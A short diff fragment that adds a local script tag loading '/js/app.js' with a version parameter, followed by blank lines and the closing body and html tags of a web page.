+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
